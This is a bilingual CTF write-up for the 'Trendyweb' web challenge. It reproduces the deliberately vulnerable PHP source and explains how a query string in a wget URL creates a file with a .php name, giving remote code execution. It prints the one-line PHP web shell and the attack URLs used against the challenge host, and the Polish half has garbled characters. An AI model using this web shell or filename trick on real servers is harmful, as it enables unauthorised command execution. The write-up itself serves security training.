## Trendyweb (Web, 100p)

###ENG
[PL](#pl-version)

We get the source for index.php running on server:

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
ini_set('allow_url_fopen', 'On'); // yo!

$session_path = '';

	class MyClass { function __wakeup() { system($_GET['cmd']); // come onn!
	} }

	function onShutdown() {
		global $session_path;
		file_put_contents($session_path. '/pickle', serialize($_SESSION));
	}

	session_start();
	register_shutdown_function('onShutdown');

	function set_context($id) {
		global $_SESSION, $session_path;

		$session_path=getcwd() . '/data/'.$id;
		if(!is_dir($session_path)) mkdir($session_path);
		chdir($session_path);

		if(!is_file('pickle')) $_SESSION = array();
		else $_SESSION = unserialize(file_get_contents('pickle'));
	}

	function download_image($url) {
		$url = parse_url($origUrl=$url);
		if(isset($url['scheme']) && $url['scheme'] == 'http')
			if($url['path'] == '/avatar.png') {
				system('/usr/bin/wget '.escapeshellarg($origUrl));
			}
	}

	if(!isset($_SESSION['id'])) {
		$sessId = bin2hex(openssl_random_pseudo_bytes(10));
		$_SESSION['id'] = $sessId;
	} else {
		$sessId = $_SESSION['id'];
	}
	session_write_close();
	set_context($sessId);
	if(isset($_POST['image'])) download_image($_POST['image']);
?>

<img src="/data/<?php echo $sessId; ?>/avatar.png" width=80 height=80 />
```

And information that we need a shell to run a flag reader in `/`.

Intially we focused on the obvious unserialize vulnerability, but we could not figure out how to put our payload inside `pickle` file.
The only way seemed to be using the `download_image` function, but wget would not save the file under selected name.
While considering if this can be overriden we found out that wget behaves interestingly when the URL has some GET parameters.

Specifically downloading from URL `http://something.pwn/avatar.png?hacked.php` will actually create a file with name `avatar.png?hacked.php`.
At the same time the `parse_url` checks in `download_image` will pass since the GET parameters are not part of `$url['path']`.

Since the uploaded file had now .php extension the server was interpreting the script inside, so we simply put a PHP shell inside:

```php
<? system($_GET['cmd']) ?>
```

And with that we could simply run 

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=ls /`

to get the name of flag reading binary (`flag_is_heeeeeeeereeeeeee`) and then:

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=/flag_is_heeeeeeeereeeeeee`

to get the actual flag: `1-day is not trendy enough`

###PL version

Dostajemy ??r??d??o pliku index.php dzia??aj??cego na serwerze:

```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
ini_set('allow_url_fopen', 'On'); // yo!

$session_path = '';

	class MyClass { function __wakeup() { system($_GET['cmd']); // come onn!
	} }

	function onShutdown() {
		global $session_path;
		file_put_contents($session_path. '/pickle', serialize($_SESSION));
	}

	session_start();
	register_shutdown_function('onShutdown');

	function set_context($id) {
		global $_SESSION, $session_path;

		$session_path=getcwd() . '/data/'.$id;
		if(!is_dir($session_path)) mkdir($session_path);
		chdir($session_path);

		if(!is_file('pickle')) $_SESSION = array();
		else $_SESSION = unserialize(file_get_contents('pickle'));
	}

	function download_image($url) {
		$url = parse_url($origUrl=$url);
		if(isset($url['scheme']) && $url['scheme'] == 'http')
			if($url['path'] == '/avatar.png') {
				system('/usr/bin/wget '.escapeshellarg($origUrl));
			}
	}

	if(!isset($_SESSION['id'])) {
		$sessId = bin2hex(openssl_random_pseudo_bytes(10));
		$_SESSION['id'] = $sessId;
	} else {
		$sessId = $_SESSION['id'];
	}
	session_write_close();
	set_context($sessId);
	if(isset($_POST['image'])) download_image($_POST['image']);
?>

<img src="/data/<?php echo $sessId; ?>/avatar.png" width=80 height=80 />
```

Oraz informacje, ??e potrzebujemy shella aby uruchomic program do odczytania flagi znajduj??cy si?? w `/`.

Pocz??tkowo skupili??my si?? na ewidentnej podatno??ci unserialize, ale nie mogli??my doj???? do tego, jak umie??ci?? nasz payload w pliku `pickle`.
Jedyna sensowna droga sugerowa??a u??ycie funkcji `download_image`, ale nie wiedzieli??my jak zmusi?? wgeta do zapisania pliku pod inn?? nazw??.
Podczas rozwa??ania jak mo??na zmieni?? nazw?? wynikowego pliku zauwa??yli??my, ??e wget ciekawe obs??uguje URLe  z parametrami GET.

Konkretnie pobieranie z URLa `http://something.pwn/avatar.png?hacked.php` utworzy plik o nazwie `avatar.png?hacked.php`.
Jednocze??nie wszystkie warunki w`parse_url` b??d?? nadal spe??nione bo parametry GET nie s?? cz????ci?? `$url['path']`.

Poniewa?? tak uploadowany plik ma rozszerzenie .php serwer wykonuje skrypty w nim zawarte, wi??c umie??cili??my tam prosty PHP shell:

```php
<? system($_GET['cmd']) ?>
```

I w ten spos??b mogli??my uruchomi??:

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=ls /`

aby pobra?? nazw?? programu do odczytywania flagi (`flag_is_heeeeeeeereeeeeee`) a nast??pnie:

`http://chal.cykor.kr:8082/data/70c1e5e960e833a1183b/avatar.png%3fhacked.php?cmd=/flag_is_heeeeeeeereeeeeee`

aby odczyta?? flag??: `1-day is not trendy enough`
